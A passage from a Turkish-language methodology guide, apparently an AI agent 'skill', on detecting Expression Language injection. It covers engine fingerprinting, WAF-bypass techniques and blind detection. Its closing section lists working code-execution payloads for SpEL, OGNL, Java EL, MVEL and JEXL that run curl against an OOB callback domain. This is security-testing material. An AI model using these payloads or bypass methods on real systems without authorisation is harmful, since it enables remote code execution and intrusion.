  değeri olarak (`<rule expr="ifade"/>`); burada ayrıca kullanılan
  tırnak türü (`"` veya `'`) kapatılmalıdır — element context'inden
  **farklı** bir escape kümesi gerektirir. Somut black-box örnekleri:
  Spring XML configuration (`<bean>` tanımlarında `#{...}` kullanan
  eski-stil XML-based Spring config), Apache Camel XML route
  tanımları (`<simple>`/`<el>` elemanları), JSF XML view (`.xhtml`
  dosyalarında Facelets attribute'ları), SOAP body/header parametreleri
  (bir SOAP web service'in XML gövdesindeki bir alan, arkada bir EL
  motoruna besleniyorsa).
- **Query/sort parameter context** — Spring Data `?sort=` gibi bir
  URL parametresinin doğrudan SpEL/OGNL'e beslendiği durum.
- **Nested expression context** — bir EL ifadesi içinde başka bir EL
  ifadesi çağıran include/import benzeri yapılar (nadir ama bazı
  motorlarda mevcut).
- **DRL/FEEL statement context** — bir kural motorunun tam bir
  "when/then" bloğu veya DMN karar tablosu hücresi.

Aynı payload farklı context'lerde farklı davranır çünkü bazı
context'lerde ekstra kapanış karakteri (`"`, `'`, `}`) gerekir, bazı
context'lerde ise hiç delimiter gerekmez (çıplak ifade kabul edilir).

### Context Tespit Prosedürü

1. Önce **kapatma karakteri olmadan** salt bir marker gönder;
   response'ta marker'ın etrafındaki karakterleri incele.
2. Sırasıyla olası kapatıcı dizileri ekle: `"`, `'`, `}`, `%}` —
   hangisinin syntax hatasını **düzelttiğini** gözlemle.
3. Context bilgisi elde edildikten sonra payload'ı otomatik olarak bu
   kapatıcı ön-ek ile zenginleştir.

### Type Confusion / Object-Context Karışma Riski (KRİTİK SINIR)

Bir parametrenin uygulama tarafından `getattr(obj, user_input)`
benzeri (Java'da `PropertyUtils.getProperty(obj, user_input)` gibi)
kullanılması **tek başına ve otomatik olarak EL Injection değildir**.
Bu daha genel bir **unsafe reflection/property access** problemidir
ve EL Injection'dan tamamen ayrı bir zafiyet sınıfı olarak da var
olabilir (bu skill'in kapsamı dışındadır).

**EL Injection sayılması için gereken şart:** Kontrol akışının
gerçekten bir **EL parser/evaluator**'a girmesi gerekir — yani girdi,
motorun ifade AST'sini/bytecode'unu üreten veya çalıştıran koda
ulaşmalıdır (bkz. §3 Source→Sink). Girdi yalnızca zaten var olan bir
Java reflection çağrısının **parametresi** olarak kullanılıyorsa
(EL motoru hiç devreye girmeden) bu "property access injection"dır —
EL Injection **değildir**.

**SSTI ile ayrım:** bkz. §3.2 — bu skill'in en kritik sınırlarından
biri, orada detaylandırılmıştır.

**XSS ile ayrım:** bkz. §3.1.

**Pratik test:** Motorun **kendi** delimiter/expression sözdizimini
(`${ }`, `#{ }`, `T(...)`, `@...@`) parametre değeri olarak dene. Bu
sözdizimi **motor tarafından derleniyorsa** → gerçek EL Injection.
Yalnızca `.`, `[]` gibi düz attribute-access karakterlerinin kabul
edilmesi ama EL delimiter'larının **derlenmemesi** → bu bir EL
Injection değil, property access injection'dır.

---

## 7. EL Motoru Fingerprinting — Confidence Seviyeli Sinyal Modeli

Generic detection **pozitif** çıktıktan sonra "hangi motor?" sorusuna
cevap arayan aşama. Amaç, minimum request ile ayrım yapmak.

### Bu Bir "Kesin Karar Ağacı" Değildir

Aynı davranış (örn. `${6666*6666}`'nın çalışması) şunlara göre
değişebilir: **motor sürümü, uygulamanın configuration'ı, kayıtlı
custom function/context değişkenleri, sandbox durumu, context.**
Her gözlem bir **confidence seviyesiyle** etiketlenmelidir:

- **Strong indicator** — motora özgü, taklit edilmesi zor bir sinyal
  (örn. stack trace'te tam paket/sınıf adı geçmesi:
  `org.springframework.expression.spel.SpelEvaluationException`).
- **Medium indicator** — birden fazla motorda görülebilir ama belirli
  bir aileyi güçlü şekilde destekler (örn. `T(java.lang.Runtime)`
  sözdiziminin kabul edilmesi → SpEL'e özgü, ama OGNL'de de benzer
  `@java.lang.Runtime@` sözdizimi vardır — ayrı bir Strong indicator
  olarak ayrıştırılmalı).
- **Weak indicator** — tek başına düşük ayırt edicilik (örn. `${ }`
  delimiter'ının çalışması — hem Java EL hem SpEL hem bazı OGNL
  konfigürasyonlarında ortak).
- **Negative indicator** — bir davranışın **olmaması** da bilgi verir.

### Hipotez Takibi — Fingerprint Bir Ranking'dir, Deterministik Sınıflandırma Değil

```
engine_hypotheses:
  - SpEL:   leading    (T(java.lang.Runtime) kabul edildi + 1 medium indicator)
  - OGNL:   candidate  (${ } delimiter ortak, ayırt edici değil)
  - JavaEL: candidate  (${ } delimiter ortak)
  - MVEL:   ruled-out  (çıplak ifade sözdizimi reddedildi, hata mesajı farklı)
```

Durum etiketleri (`leading`/`candidate`/`ruled-out`) SSTI skill'indeki
tanımla birebir aynıdır. `leading` hipotez yalnızca en az bir **Strong
indicator** ile doğrulandığında `confirmed` engine'e dönüşür.

### Sinyal Toplama Sırası (Rehber, Kesin Akış Değil)

```
${6666*6666} → 44435556 mı?
 ├─ Evet → T(java.lang.Runtime) veya T(java.lang.System) sözdizimi
 │    kabul ediliyor mu dene
 │    ├─ Evet ("T(...)" çalışıyor) → SpEL güçlü olasılık → §12.3
 │    ├─ Hayır ama "@java.lang.Runtime@getRuntime()" çalışıyor →
 │    │    OGNL güçlü olasılık → §12.2
 │    ├─ İkisi de çalışmıyor, ama "class.forName(...)" tarzı düz Java
 │    │    reflection zinciri çalışıyor → Java EL/UEL olasılığı → §12.1
 │    └─ Hiçbiri çalışmıyor ama aritmetik çalışıyor → MVEL/JEXL/CEL/
 │         Aviator/QLExpress olasılığı, aşağıdaki dallara devam
 ├─ Çalışmıyor ama delimiter reflect ediliyor, aritmetik yok →
 │    **motor attribution yapılamaz** (bu sinyal CEL'e özgü değildir
 │    — aynı gözlem "burası hiç bir EL sink'i değil" ihtimaliyle de
 │    tutarlıdır; CEL'de zaten delimiter yoktur, dolayısıyla `${...}`'ın
 │    reflect edilmesi CEL lehine özel bir kanıt oluşturmaz). Bu durum
 │    `engine_hypothesis: unknown`, `evidence_category: none` olarak
 │    kaydedilir; CEL'i test etmek için ayrıca §2'deki reachability
 │    kontrolü (teknoloji + saldırgan-kontrollü kaynak) veya delimiter'sız
 │    çıplak ifade testi (aşağıdaki dal) gerekir.
 └─ Hayır (hiç ${ } tepkisi yok) → #{...} dene (JSF composite
      component context) → hâlâ yoksa çıplak "6666*6666" dene
      (OGNL/MVEL/JEXL/Aviator/QLExpress delimiter'sız context'i) →
      çalışıyorsa aşağıdaki ayırt edici sinyallere geç
```

**Delimiter'sız (çıplak ifade) motorlar arası ayrım — kritik ek
adım:** OGNL, MVEL, JEXL, CEL, Aviator ve QLExpress'in hepsi çoğu
zaman **delimiter'sız çıplak ifade** kabul eder ve hepsi temel
aritmetiği destekler — bu yüzden yalnızca `6666*6666` çalışmasının
kendisi bu altı motoru **birbirinden ayırmaz**. Ayrım için:

- `@java.lang.Runtime@getRuntime()` çalışıyorsa → **OGNL** (bu
  `@Class@` sözdizimi OGNL'e özgüdür, Strong indicator).
- `new java.lang.String("x")` tarzı düz `new` çağrısı çalışıyorsa →
  **MVEL** olasılığı yüksek (MVEL Java benzeri `new` sözdizimini
  doğrudan destekler).
- `1 + 1` gibi çok temel aritmetik çalışıyor ama `class`/`new`/`T(...)`
  hiçbiri çalışmıyorsa → **CEL** olasılığı yüksek (CEL bilinçli olarak
  sandbox'lıdır, sınıf erişimi yoktur — bkz. §12.6).
- Hata mesajında `com.googlecode.aviator` geçiyorsa → **Aviator**
  (Strong indicator).
- Hata mesajında `com.ql.util.express` geçiyorsa → **QLExpress**
  (Strong indicator).
- Hata mesajında `org.apache.commons.jexl3` geçiyorsa → **JEXL**
  (Strong indicator).

### Ek Sinyaller

- **Error message fingerprinting (Strong indicator):**
  `ognl.OgnlException`, `ognl.MethodFailedException`,
  `org.springframework.expression.spel.SpelEvaluationException`,
  `org.springframework.expression.spel.SpelParseException`,
  `javax.el.ELException`, `javax.el.PropertyNotFoundException`,
  `jakarta.el.ELException` (Jakarta EE 9+ isim alanı değişikliği —
  motor aynı, paket adı farklı), `org.mvel2.CompileException`,
  `org.mvel2.PropertyAccessException`,
  `org.apache.commons.jexl3.JexlException`,
  `com.googlecode.aviator.exception.ExpressionRuntimeException`,
  `com.ql.util.express.ExpressRunner` — en güvenilir sinyal, ama
  debug modu kapalıysa hiç alınamayabilir.
- **HTTP header/teknoloji sinyalleri (Weak indicator):** `X-Powered-By`,
  `JSESSIONID` (Java-family), `Server` header'ı.
- **Framework artefaktları (Medium indicator):** Struts2'ye özgü
  `struts.xml`/`.action` uzantısı → OGNL; Spring Boot Actuator
  endpoint'leri (`/actuator`) → SpEL; JSF `ViewState`/`faces-config.xml`
  → Java EL/UEL.
- **Context değişkeni fingerprint'i (Strong indicator — motora özgü
  context anahtarları):**
  - OGNL/Struts2: `#context`, `#request`, `#session`,
    `#_memberAccess` (`_memberAccess` özellikle Struts2/OGNL'e çok
    özgü bir isimdir).
  - SpEL/Spring: `#root`, `systemProperties`, `systemEnvironment`.
  - Java EL/JSF: `#{facesContext}`, `#{view}`, `#{flash}`.
  - MVEL: `context` genelde uygulamaya özel isimlendirilir, ayırt
    edici değildir — bu motoru fingerprint etmek için error
    signature'a güvenmek daha güvenilirdir.

### Negative Capability Matrix — Beklenen "Çalışmama" Davranışı

| Motor | Beklenen NEGATİF (bu motorda normaldir, "EL Injection yok" anlamına gelmez) |
|---|---|
| CEL | `T(java.lang.Runtime)`, `class`, `new`, herhangi bir sınıf erişimi ÇALIŞMAZ — bu CEL'in **tasarım gereği** sandbox'lı olmasıdır, motoru elemez (bkz. §12.6) |
| FEEL | `${...}`/`#{...}` delimiter'ı çalışmaz — FEEL kendi sözdizimini kullanır (`if...then...else`, delimiter'sız), bkz. §12.7 |
| Java EL (katı JSR-341 implementasyonu) | Bazı implementasyonlarda `Runtime.getRuntime()` doğrudan static erişim kısıtlı olabilir — `ELProcessor`/`ImportHandler` üzerinden dolaylı erişim denenmeli (bkz. §12.1), bu motoru elemez |
| MVEL (strict mode) | Bazı entegrasyonlar MVEL'i "strict type mode" ile çalıştırır — dinamik `class.forName` bazı context'lerde kısıtlı olabilir, `ParserContext` ayarına bağlıdır |
| Aviator (eski sürümler) | `new`/sınıf erişimi bazı sürümlerde tamamen kapalıdır (yalnızca fonksiyon çağrısına izin verir) — versiyon-dependent, bkz. §12.8 |

**Kullanım kuralı:** Bir negatif sonuç gördüğünde önce bu tabloya bak
— "bu motorda zaten beklenen bir negatif mi" sorusunu sormadan "EL
Injection yok" sonucuna varma.

### Kurallar

- Birden fazla EL motoru aynı uygulamada bulunabilir (örn. ana
  uygulama SpEL, entegre edilmiş bir kural motoru MVEL kullanıyor) —
  fingerprinting **her endpoint için ayrı** yapılmalı.
- Motor fingerprint edilemezse, §6'daki context detection'a geri dön
  ve gerekirse polyglot payload'larla (§5) tekrar dene.
- Versiyon farkları önemlidir (örn. Spring'in bazı sürümleri
  `SpelCompilerMode`/`SimpleEvaluationContext` kullanarak `T(...)`
  erişimini varsayılan olarak **kapatabilir** — bu, SpEL'i elemez,
  yalnızca uygulamanın hangi `EvaluationContext` tipini kullandığını
  gösterir, bkz. §12.3).
- **Raporlama kuralı:** Nihai raporda motor adı **"confirmed"** veya
  **"olası/probable"** olarak açıkça etiketlenmelidir.

---

## 8. Encoding, WAF/Filter, Evidence Kategorileri, False Positive/Negative

### 8.1 Encoding / Transformation Etkisi

Input, EL motoruna ulaşmadan önce şu katmanlardan geçebilir: URL
decode → uygulama seviyesi custom decode → charset dönüşümü →
framework'ün otomatik unescape'i → (opsiyonel) WAF/filter kontrolü →
EL motoru.

**Pratik yaklaşım:**
- Bir parametrenin Base64/hex/URL-encoded olup olmadığını response
  davranışından çıkar.
- Şüpheleniliyorsa payload'ı hem düz hem encode edilmiş halde dene.
- İkisi de negatifse çoklu encode katmanı varsayımıyla çift/üçlü
  encode varyantlarını sırayla dene. **Gerçek dünya örneği (SSTI
  skill'indeki `%25set%25` prensibiyle birebir aynı mantık, EL'e
  uyarlanmış):** Bir WAF `T(java.lang.Runtime)` gibi literal bir
  string arıyorsa ama gerçek istekte bu `%54%28java.lang.Runtime%29`
  (kısmi URL-encode) olarak gönderilip sunucu tarafında tek decode
  sonrası motora ulaşıyorsa, filtre bunu yakalayamayabilir.
- Motora özgü kaçış/kod noktası inşası (Java EL/OGNL/SpEL'de
  `T(java.lang.Character).toString(N)` ile karakter kod noktasından
  string üretme, bkz. §12) hem fingerprint sinyali hem de
  filter-bypass aracıdır.

### 8.2 WAF / Filter — Sıralı Akış

**Sıra:** Detection → Filter identification → Transformation var mı
tespiti → Alternative representation → Re-test.

1. **Detection:** Generic probe'lar denenir (§5).
2. **Filter identification:** Hangi karakter/kelime filtreleniyor
   tespit edilir (örn. `Runtime` her zaman 403 dönüyor ama parçalanmış
   hali dönmüyor).
3. **Transformation var mı tespiti:** Uygulamanın kendisi mi
   (sanitizer/blacklist) yoksa önündeki bir WAF mı engelliyor.
4. **Alternative representation:** Yalnızca detection **pozitif**
   çıktıktan sonra, sınırlı sayıda, agresiflik artan sırada denenir
   (§8.2.1'deki taksonomi).
5. **Re-test:** Alternative representation ile generic probe tekrar
   denenir.

### 8.2.1 Bypass Payload Taksonomisi (B1–B16)

EL'e özgü genişletilmiş bypass kategorileri (SSTI skill'indeki B1-B12
tabanı korunmuş, EL'e özgü B13-B16 eklenmiştir):

| Kod | Kategori | Örnek (EL bağlamında) |
|---|---|---|
| B1 | Encoding | URL/hex/unicode encode edilmiş delimiter/anahtar kelime |
| B2 | Double encoding | `%2554%2528` gibi çift URL-encode |
| B3 | Case transformation | `RUNTIME`/`rUnTiMe` — çoğu EL motoru case-sensitive'dir, ama bazı özel wrapper'lar case-insensitive kontrol yapabilir |
| B4 | Whitespace insertion | `T (java.lang.Runtime)` — bazı parser'lar boşluğa toleranslıdır |
| B5 | Comment insertion | Motorun kendi yorum sözdizimi varsa (nadir, çoğu EL motorunda yorum yoktur) |
| B6 | String concatenation | `'Run'+'time'` / OGNL'de `'Run'+'time'` şeklinde anahtar kelime parçalama |
| B7 | Character construction | `T(java.lang.Character).toString(82)+...` ile karakter kod noktasından string üretme |
| B8 | Indirect reference | Sınıf adını bir değişkene/context anahtarına atayıp dolaylı çağırma |
| B9 | Reflection chain varyasyonu | `getClass().forName(...)` yerine `Class.forName(...)` veya `getClass().getClassLoader().loadClass(...)` — aynı hedefe farklı API yoluyla ulaşma |
| B10 | Alternate delimiter | `${...}` engelliyse `#{...}`/`%{...}` dene (aynı motorun alternatif syntax'ı — bkz. §12) |
| B11 | Nested evaluation | Bir evaluation sonucunu başka bir evaluation'a girdi yapma |
| B12 | Parser differential | Bkz. §8.2.2 |
| B13 | Static import / ImportHandler abuse | Java EL/UEL'de `ELProcessor.defineFunction`/`ImportHandler` üzerinden dolaylı sınıf erişimi (bkz. §12.1) — bazı blacklist'ler yalnızca doğrudan `T(...)`/`@...@` kalıplarını arar |
| B14 | Bean/context reference pivot | SpEL/OGNL'de doğrudan `T(java.lang.Runtime)` engelliyse, context'te zaten expose edilmiş (application-specific) bir bean/obje üzerinden reflection zincirine ulaşma (örn. `#request.class.classLoader...`) |
| B15 | Array-index property access | `.getClass()` yerine `["class"]` (map/array-style property erişimi) — motor için eşdeğer, literal metot adı arayan filtre için farklı görünür (bkz. §12.1) |
| B16 | Method-index reflection | `getMethod("exec", ...)` yerine `getMethods()[N]` — literal metot adı string'ini payload'dan tamamen çıkarır, indeks JVM/sürüme göre önce doğrulanmalıdır (bkz. §12.1) |

Bu tablo **denenecek payload listesi değil**, bir sınıflandırmadır —
somut payload'lar §12'deki motor profillerinde bulunur.

**Ne zaman uygulanır:** Bypass, yalnızca gerçek bir filtreleme/delivery
sinyali (ör. WAF block, karakter stripping, ham payload'ın generic
detection'da negatif dönmesi ama context'in EL sink'i olduğuna dair
başka kanıt olması) varsa ve denenen teknik yeni bir sinyal üretme
ihtimali taşıyorsa devreye girer — B1'den B16'ya kadar tüm kategoriler
her adayda sırayla/tüketici biçimde denenmez. Bu, request bütçesini
korur ve gerçek sinyal olmayan durumlarda gereksiz gürültü
üretilmesini önler; ama gerçek bir filtreleme kanıtı varsa, hangi
kategorinin işe yarayacağı önceden tahmin edilemez, bu yüzden o
durumda birden fazla kategori denenmesi meşrudur.

### 8.2.2 Parser Differential Payload'lar

İstek, hedefe ulaşana kadar birden çok **parser katmanından** geçer
(WAF parser → framework decoder → application parser → EL parser) ve
bu katmanlar aynı input'u **farklı** yorumlayabilir. Aranması gereken
decode/normalize farkları:

- URL decode (tek/çift/üçlü katman)
- HTML entity decode (`&#123;` vb. — özellikle JSP/JSF attribute
  context'inde)
- Unicode normalization (NFC/NFD, homoglyph'ler)
- JSON string escaping (`\u0054` gibi — API tabanlı EL sink'lerinde
  yaygın, çünkü çoğu EL Injection modern REST API'ler üzerinden
  tetiklenir)
- Form decode davranışı
- İç içe (nested) EL evaluation — bir evaluation sonucunun tekrar
  parse edilmesi (bkz. B11)

**Pratik test — signal-driven, otomatik değil (SSTI skill'indeki
aynı prensip):** Yalnızca §8.2'deki WAF/Filter akışı bir delivery/
filter sinyali tespit ettiğinde devreye girer.

### 8.2.3 Karakter-Seviyesi Encoding Oracle — Delimiter Karakterlerini Ayrı Ayrı Encode Ederek Tetikleme

**Adım 1 — Gözlem:** Düz bir payload gönder (`${6666*6666}`) ve
response'ta `$`, `{`, `}`, `*` karakterlerinin ne şekilde yansıdığına
bak.

**Adım 2 — Karar kuralı:** Hangi karakter(ler) encode edilmiş
yansıyorsa yalnızca onları encode et, diğerlerini düz bırak.

**Adım 3 — Denenecek encoding varyantları (artan karmaşıklık
sırasıyla, her biri transit için URL-encode edilerek gönderilir):**

1. **HTML decimal entity:** `%26%23036;%26%23123;6666*6666%26%23125;`
   (decode: `&#036;&#123;6666*6666&#125;` → `$`, `{`, `}`)
2. **Zero-padded HTML decimal entity:**
   `%26%230000036;%26%230000123;6666*6666%26%230000125;`
3. **HTML hex entity:** `%26%23x24;%26%23x7B;6666*6666%26%23x7D;`
4. **Unicode escape (Java-style, EL'e özgü ek varyant — Java EL/OGNL/
   SpEL bazı bağlamlarda Java `\uXXXX` unicode escape'ini native
   olarak işleyebilir çünkü bunlar JVM diline çok yakındır):**
   `%5Cu0024%5Cu007B6666*6666%5Cu007D`
   (decode: `\u0024\u007B6666*6666\u007D`)

**Adım 4 — `*`/`-` karakteri kararı:** Adım 1'deki gözleme göre, aynı
karar kuralı SSTI skill'indeki gibi uygulanır — `*`/`-` düz yansıyorsa
olduğu gibi bırak, encode edilmiş yansıyorsa aynı şemayla encode et.

**Bu teknik ne zaman denenir:** Yalnızca §5'teki standart probe'lar
**negatif** döndüğünde VE Adım 1'deki gözlem en az bir karakterin
encode edilmiş yansıdığını gösterdiğinde.

### 8.3 Evidence Kategorileri — İki Ayrı Eksen: Causality vs Attribution

```
Eksen 1 — Causality (EL Injection'ın kendisi)
├── Reflection-correlation evidence  (marker + sonuç aynı yerde, tesadüf değil)
├── Evaluation evidence              (deterministic hesaplama + geçerli negatif kontrol)
├── Stored/indirect execution evidence (zincir haritalama ile doğrulandı mı)
└── OOB evidence                      (network callback alındı mı)

Eksen 2 — Attribution (hangi EL motoru)
├── Engine fingerprint evidence       (error/syntax sinyalleri)
├── Error signature evidence          (paket/sınıf adı içeren stack trace)
└── Framework/CMS fingerprint evidence (§13 tablosundan)

Destekleyici (tek başına ne causality ne attribution kanıtlar)
└── Context evidence                  (payload doğru context'e oturdu mu)
```

**Kanıt bağımsızlığı (Eksen 1 içinde):** SSTI skill'indeki aynı kural
— aynı altta yatan davranışa (yalnızca "aritmetik motoru çalışıyor")
dayanan iki farklı payload, tek bir kanıt (evaluation evidence)
sayılır. Farklı bir operatör (çarpma vs çıkarma vs concatenation) ile
elde edilen ikinci bir evaluation sonucu, farklı bir kod yolunu test
ettiği için daha güçlü bir teyittir ama yine de tek başına yeni bir
kategori oluşturmaz.

| Kombinasyon | Sonuç |
|---|---|
| çarpma + çarpma (farklı sayılarla) | Aynı evidence category (evaluation) |
| çarpma + çıkarma + concatenation | Aynı evidence category (evaluation) — ama daha güçlü teyit |
| evaluation + OOB | İki farklı evidence category — gerçek bağımsız kanıt |
| evaluation + stored/indirect execution | İki farklı evidence category |
| evaluation + engine fingerprint (Eksen 2) | Eksen 1 içinde tek kategori kalır |

### 8.4 False Positive / False Negative Eliminasyonu

**Sınıflandırma — iki ayrı sonuç üretir (EL Injection classification
VE engine classification ayrı ayrı raporlanır):**

*EL Injection (causality) classification:*
- **Confirmed:** Eksen 1'den **tek bir kanıt türü bile** yeterlidir:
  - **Evaluation evidence:** §5'teki üç şart tam olarak sağlanmalı.
  - **Stored/Indirect evidence:** §9.1'deki zincirin her adımı ayrı
    doğrulanmış olmalı.
  - **OOB evidence:** §9.3'teki gibi benzersiz bir callback/token
    alınmış ve gerçekten hedef execution'dan geldiği doğrulanmış
    olmalı.
- **Probable:** Evaluation sinyali var ama negatif kontrol tam
  doğrulanamadı, veya yalnızca reflection-correlation seviyesinde
  kanıt var.
- **Inconclusive:** Belirsiz/kısmi sinyal.
- **Negative:** Eksen 1'den hiçbir kanıt alınamadı.

*Engine (attribution) classification — ayrı bir alan:*
- **Confirmed:** En az bir Strong indicator + tutarlı davranış.
- **Probable:** Yalnızca weak/medium indicator'lar var.
- **Unknown:** Hiçbir attribution sinyali toplanamadı — "Confirmed EL
  Injection, engine: unknown/custom" geçerli ve eksiksiz bir sonuçtur.

**Yaygın false-positive kaynakları:**
- **CDN/cache** eski bir response'u tekrar sunuyor → cache-busting
  parametresi ekleyerek ele.
- **WAF'ın kendi hata sayfası** EL hatasıyla karıştırılıyor.
- **Uygulamanın kendi meşru "hesap makinesi/formül/kural motoru"
  özelliği** — aritmetik/koşul sonucunu doğal olarak gösteriyor
  olabilir (özellikle Drools/Camunda tabanlı legitimate business-rule
  UI'larında); bağlamı kontrol et — kullanıcı gerçekten **yeni bir
  ifade** mi yazabiliyor, yoksa önceden tanımlı bir dropdown/şablon
  arasından mı seçiyor?
- **Property access injection ile karıştırılması** — bkz. §6 Type
  Confusion.
- **SSTI ile karıştırılması** — bkz. §3.2, bu ayrımı raporda mutlaka
  netleştir.

**Evidence Tablosu Şablonu** — her aday için tut (SSTI skill'indeki
şemayla aynı alanlar):

| Alan | Açıklama |
|---|---|
| payload | Kullanılan tam payload |
| context | plain/attribute/JSON-field/config-value/expression |
| status_code | Baseline ile karşılaştırmalı |
| response_diff | Length/timing/header farkı |
| evidence_kategorisi | reflection-correlation / evaluation / stored-indirect / OOB (Eksen 1) veya fingerprint/error-signature/framework-fingerprint (Eksen 2) |
| el_injection_classification | confirmed / probable / inconclusive / negative |
| engine_classification | confirmed / probable / unknown |
| confidence | §10.5 Confidence Scoring'e göre puan (yalnızca destekleyici) |

---

## 9. Stored / Indirect / Blind EL Injection

### 9.1 Stored/Indirect Zincir Haritalama

1. Payload'ı biricik bir marker ile olası "kaynak" alana gönder
   (kural tanımı, workflow koşulu, yetkilendirme ifadesi, sıralama
   tercihi kaydı vb.).
2. Uygulamanın bu veriyi nerede **evaluate edebileceğini** haritalandır:
   bir sonraki kural motoru çalıştırma döngüsü, bir sonraki
   yetkilendirme kontrolü, zamanlanmış bir workflow tetiklemesi,
   admin panelinde "kuralları önizle" işlevi.
3. Her olası evaluation noktasını (mümkünse) tetikle veya bekle.
4. Zincir 2+ adımdan oluşuyorsa her adımı ayrı doğrula.

**Gerçek dünya deseni — kural/workflow motoru zinciri:** Drools/
Camunda gibi bir kural motoru kullanan uygulamalarda, kullanıcı bir
"koşul" veya "aksiyon" ifadesini kaydeder (örn. bir onay akışı kuralı)
ve bu ifade **başka bir kullanıcının** işlemi tetiklediği anda (örn.
bir talep onaya düştüğünde) evaluate edilir — bu klasik bir
stored/indirect zincirdir; saldırgan kendi isteğinde hiçbir zaman
doğrudan yanıt göremeyebilir, etkiyi yalnızca zamanlanmış/tetiklenen
worker loglarında veya yan etkilerinde (OOB) gözlemleyebilir.

**Gerçek dünya deseni — Spring Data sort/filter zinciri:** Bir arama
sonucunun "en son kullanılan sıralama tercihini hatırla" gibi bir
özellikte kaydedilmesi ve bu tercihin **başka bir endpoint'te**
(örn. bir raporlama/export endpoint'inde) tekrar `Sort` objesine
dönüştürülüp SpEL'e beslenmesi — sink, orijinal kayıt endpoint'inden
tamamen farklı bir yerde olabilir.

### 9.2 Blind EL Injection — Timing-based

- Motora özgü "yapay olarak yavaş" bir ifade enjekte et (örn. büyük
  bir range üzerinde iterasyon — bkz. ilgili motor profili §12).
- Ağ varyansını elemek için birden fazla ölçüm al, istatistiksel eşik
  kullan (median + 3×IQR).
- Timing tek başına **probable** kanıt sayılır, confirmed için OOB
  veya stored/indirect gibi daha güçlü bir Eksen 1 kanıtı tercih
  edilmelidir (bkz. SSTI skill §9.2'deki aynı gerekçe — timing yalnızca
  istatistiksel korelasyon sağlar, doğrudan causality kanıtı değildir).

**Sınırlı kaynak kullanımı (bounded resource probe) — KRİTİK:**
Timing probe'u §0.2'deki "kasıtlı ağır DoS yok" kuralına tabidir.
Somut başlangıç değeri: **N=10** ölçüm (baseline ve aday için ayrı ayrı,
aynı N — N=7'den yükseltildi, çünkü düşük örneklem network varyansı
yüksek ortamlarda güvenilir bir medyan/IQR üretmeyebilir), ağ/sunucu
varyansı yüksekse (IQR, medyanın önemli bir kısmına yakınsa) N=15-20'ye
çıkar. Karar kuralı:
aday payload'ın medyanı, baseline medyanının **+3×IQR** değerini
aşıyorsa VE aşağıdaki üç koşul **birlikte** sağlanıyorsa → timing
evidence pozitif (sabit bir mutlak ms eşiği yerine, hem düşük hem
yüksek gecikmeli hedeflerde doğru çalışan adaptif bir kombinasyon):
```text
1. İstatistiksel ayrışma: aday medyanı > baseline medyanı + 3×IQR
2. Göreli fark: aday medyanı, baseline medyanının en az ~%20-30
   fazlası (yüksek-latency bir API'de, ör. baseline=2sn, aday=2.6sn
   → %30 fark anlamlıdır; düşük-latency bir API'de, ör. baseline=50ms,
   aday=400ms → çok daha büyük bir göreli fark, daha güçlü kanıt)
3. Varyans-tutarlılığı: fark, baseline'ın kendi ölçüm varyansından
   (IQR'ından) belirgin şekilde büyük — yalnızca ağ gürültüsü/jitter
   değil
```
Sabit bir "en az 300-500ms mutlak fark" kuralı **kullanılmaz** —
çünkü yüksek-latency bir hedefte (ör. baseline 2 saniyeyse) 300ms'lik
bir fark istatistiksel gürültüye karışabilirken, düşük-latency bir
hedefte (ör. baseline 50ms) çok daha küçük bir mutlak fark bile
(ör. 150ms) zaten anlamlı olabilir — asıl belirleyici, farkın
baseline'ın **kendi varyansına göre** ne kadar büyük olduğudur.

### 9.3 Blind EL Injection — Out-of-band (OOB)

**Düzeltme — OOB, sandbox yokluğuna değil, erişilebilir fonksiyon/
helper kümesine bağlıdır (SSTI skill'indeki aynı prensip):** OOB'un
mümkün olup olmaması, EL context'inin erişebildiği fonksiyon/object/
helper'ların network etkileşimine izin verip vermediğine bağlıdır —
CEL gibi sandbox'lı bir motorda bile whitelist'e dahil edilmiş bir
custom function OOB'a izin verebilir; SpEL/OGNL gibi sandbox'sız bir
motorda da hiçbir network-capable sınıfa erişim yoksa (nadir) OOB
mümkün olmayabilir.

Kendi kontrolündeki bir DNS/HTTP callback alan adına istek attıran
bir payload kullan; bu alan adına gelen istek güçlü bir OOB evidence
sayılır. Blind confirmation'da önce timing (daha zayıf kanıt, daha
düşük risk), mümkünse ardından OOB (daha güçlü kanıt) denenmelidir.

#### OOB Callback Aracı — interactsh-client

Bu skill, OOB testleri için **tek bir araç** önerir: **interactsh-client**
(ProjectDiscovery) — SSTI skill'inde önerilen aynı araç, aynı
gerekçeyle: yalnızca bir DNS/HTTP callback alan adı üretip gelen
etkileşimleri loglayan basit ve güncel bir araç, EL Injection'a özgü
bir "tespit" mantığı içermez.

**Kurulum:**
```bash
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
```

Go kurulu değilse önce Go'yu kurun (Debian/Ubuntu):
```bash
sudo apt update && sudo apt install -y golang-go
export PATH=$PATH:$(go env GOPATH)/bin
```

**Kullanım — test oturumunun başında bir kez başlat:**
```bash
interactsh-client -v | tee interactsh-oob.log
```
Bu komut sana biricik bir alan adı verir (örn.
`8f3a2b1c.oast.fun` gibi). Bu alan adını, o oturumdaki **tüm** EL
Injection adaylarının OOB payload'larında kullan, her payload için
path/subdomain segmentini benzersiz tutarak:

```
# SpEL (Spring), ProcessBuilder üzerinden:
${T(java.lang.Runtime).getRuntime().exec("curl http://8f3a2b1c.oast.fun/spel")}

# OGNL (Struts2), Runtime zinciriyle:
(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec("curl http://8f3a2b1c.oast.fun/ognl"))

# Java EL/UEL (ELProcessor üzerinden dolaylı):
${''.getClass().forName('java.lang.Runtime').getMethod('exec',String.class)
   .invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime')
   .invoke(null),'curl http://8f3a2b1c.oast.fun/javael')}

# MVEL, reflection zinciriyle:
new java.lang.ProcessBuilder(new java.lang.String[]{"curl","http://8f3a2b1c.oast.fun/mvel"}).start()

# JEXL, Class.forName zinciriyle:
Class.forName("java.lang.Runtime").getMethod("exec", String.class)
   .invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime")
   .invoke(null), "curl http://8f3a2b1c.oast.fun/jexl")

# CEL — genelde native network primitive'i yoktur (bkz. §12.6); OOB
# yalnızca uygulamanın kayıtlı ettiği bir custom function/extension
# fonksiyonu network-capable ise mümkündür — bu payload OOB'u
# doğrudan DEĞİL, dolaylı olarak (bir custom function'ın parametresi
# üzerinden) dener:
myCustomHttpFetch("http://8f3a2b1c.oast.fun/cel")

# Aviator, reflection zinciriyle (sürüme göre kısıtlı olabilir):
